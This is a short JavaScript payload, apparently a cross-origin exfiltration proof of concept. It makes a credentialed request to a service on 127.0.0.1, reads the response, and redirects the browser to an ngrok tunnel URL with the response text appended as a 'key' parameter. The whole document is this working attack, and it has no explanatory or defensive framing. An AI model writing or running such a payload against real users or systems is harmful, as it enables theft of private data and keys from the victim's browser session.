var xhr = new XMLHttpRequest();

xhr.onload = reqListener; 
xhr.open("GET", "http://127.0.0.1");
xhr.withCredentials = true;
xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
xhr.send();

function reqListener() {
    location='//ab84-202-162-37-174.ngrok-free.app/?key='+this.responseText; 
};
